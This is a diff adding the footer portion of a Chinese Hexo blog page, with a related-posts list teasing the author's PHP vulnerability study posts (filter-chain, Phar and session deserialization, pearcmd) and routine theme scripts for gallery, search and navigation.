+							<a class="relate-post-title" href="/2026/04/19/filter-chain%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/" title="filter-chain漏洞演示">
+								filter-chain漏洞演示			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 19日, 2026				
+							</p>
+							<p class="relate-post-content">
+								这个漏洞链被称为CNEXT 由安全员Charles Fol披露
+核心思想是利用系统内置的看似无害的模块（流过滤器）的巧妙组合 在受限的web环境之中执行命令
+原理讲解filter协议对于filter伪协议 我们肯定都不陌生这个伪协议允...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2026/04/19/filter-chain%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/" title="filter-chain漏洞演示">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/images/covers/daliyuese.jpg" alt="filter-chain漏洞演示"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2026/03/13/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/" title="Phar反序列化漏洞演示">
+								Phar反序列化漏洞演示			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 13日, 2026				
+							</p>
+							<p class="relate-post-content">
+								前言我们在之前学习的反序列化漏洞 无一不是利用了unserialize()这个函数 但是我们没有去考虑 假设此时的题目并没有给我们这个函数 我们还能否实现反序列化呢
+其实是可以的 在2018年的BlackHat 大会上 Sam Tho...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2026/03/13/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/" title="Phar反序列化漏洞演示">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/images/covers/洱海边.jpg" alt="Phar反序列化漏洞演示"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2026/03/12/pearcmd%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/" title="pearcmd漏洞演示">
+								pearcmd漏洞演示			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 12日, 2026				
+							</p>
+							<p class="relate-post-content">
+								1register_argc_argv性质这是PHP中的一个配置项 用于决定是否在脚本中声明_$argc_ 和 _$argv_ 变量这两个变量在命令行模式下是十分重要的
+
+$argc：表示传递给脚本的参数数量
+$argv:这是一个数组...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2026/03/12/pearcmd%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/" title="pearcmd漏洞演示">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/images/covers/护城河.jpg" alt="pearcmd漏洞演示"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2026/03/10/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/" title="session反序列化漏洞测试">
+								session反序列化漏洞测试			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 10日, 2026				
+							</p>
+							<p class="relate-post-content">
+								前置知识首先我们要了解session是什么
+session又被称为会话控制  和cookie类似 用于保持会话的但是cookie一般是存储再客户端的 session一般是存储在服务端的
+在PHP中 有一个php_session变量 用...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2026/03/10/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/" title="session反序列化漏洞测试">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/images/covers/南京西路.jpg" alt="session反序列化漏洞测试"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2026/02/16/%E6%9C%AA%E5%91%BD%E5%90%8D/" title="好东西">
+								好东西			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								二月 16日, 2026				
+							</p>
+							<p class="relate-post-content">
+								hello world
+
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2026/02/16/%E6%9C%AA%E5%91%BD%E5%90%8D/" title="好东西">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="好东西"/>
+							</a>
+						</div>
+					</li>												
+			
+		</ul>
+	
+</div>	
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-comment">
+
+	
+		<div class="config-info">
+			Please check the parameter of <b>comment</b> in config.yml of hexo-theme-Annie!
+		</div>	
+	
+
+</div>
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-share">
+	
+	
+
+		
+			
+			<!-- socialShare share -->
+			<div class="social-share"></div>
+
+<!--  css & js -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+			
+		
+		
+	
+</div>
+
+
+				</div>
+			</div>	
+		</div>
+	</div>
+</div>
+
+<!-- show math formula -->
+
+
+
+	
+
+
+
+
+
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+
+<script src="/plugin/fancybox/jquery.fancybox.js"></script>
+
+
+<script type="text/javascript">
+	(function gallerySet(){
+		let titleID = $('.article-title a'),
+			imageID = $('.article-content img'),
+			videoID = $('.article-content video');
+		
+		let postTitle = titleID.text() ? titleID.text() : "No post title!";
+		
+		imageID.each(function() {
+			let imgPath = $(this).attr('src'),
+				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
+		});
+		
+		videoID.each(function() {
+			let videoPath = $(this).attr('src');
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
+		});
+		
+		//TODO：支持html5 video
+
+		if($('#layout-post').length) {
+			$('[data-fancybox="gallery"]').fancybox({
+				loop: true,
+				buttons: [
+					"zoom",
+					"share",
+					"slideShow",
+					"fullScreen",
+					//"download",
+					"thumbs",
+					"close"
+				],
+				protect: true
+			});
+		}
+	})();
+</script>
+		</main>
+
+		<!--footer-->
+		<footer>
+	<div id="navigation-show">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+
+	<div class="copyright">
+		<p>
+			 
+				&copy;2025 - 2026, content by Su@sU. All Rights Reserved.
+			
+			
+				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
+			
+		</p>
+		<p>
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+
+
+			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
+			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
+		</p>
+	</div>		
+</footer>
+		
+	<!-- Local or hitokoto! -->
+
+	
+<script src="/plugin/motto/motto.js"></script>
+
+	
+	<script type="text/javascript">
+		(function motto(){
+			let mottoText = getMingYanContent().split('</br> - </br>'),
+			
+			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
+			
+			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
+			
+			mottoTextContent = mottoTextContent.trim().substring(0, 100);
+		
+			$("#motto-content").html( mottoTextContent);
+			$("#motto-author").html( mottoTextFrom  );
+		})();	
+	</script>	
+
+
+
+<!-- love effect -->
+
+	
+<script src="/plugin/love/love.js"></script>
+
+
+
+<!-- back to top -->
+
+	<div id="totop">
+	<span class="icon-circle-up"></span>
+</div>
+
+
+
+<!-- site analysis -->
+
+
+	<!-- site-analysis -->
+	
+	
+	
+	
+	
+ 
+
+<!-- leancloud -->
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+	
+
+  
+
+	<!--
+	时间：2018-10-3
+	描述：
+		插件名称：hexo-generator-search-zip
+		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
+		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
+-->
+<div class="popup search-popup local-search-popup scrollbar" >
+	<div class="local-search-container">
+		<span class="popup-btn-close">
+      		ESC
+   		</span>
+		<div class="local-search-header">
+			<div class="input-prompt">				
+			</div>
+			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+		</div>
+		<div class="local-search-body">
+			<div id="local-search-output"></div>
+		</div>
+		<div class="local-search-footer">
+			<div class="topN-post">				
+				
+								
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<script src="/plugin/search/ziploader.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script type="text/javascript">
+	var search_path = 'search.xml',
+		zip_Path = '/',
+		version_Path = '/',
+		input_Trigger = 'auto',
+		top_N = '2';
+
+	themeLocalSearch({
+		search_path, 
+		zip_Path, 
+		version_Path, 
+		input_Trigger, 
+		top_N
+	});
+</script>
+
+
+
+<script src="/plugin/chinese/chinese.js"></script>
+<script src="/plugin/imagelazyloader/yall.min.js"></script>
+<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
+<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
+<script src="/plugin/resizediv/resizediv.js"></script>
+<script src="/js/main.js"></script>
+
+	</body>	
+</html>
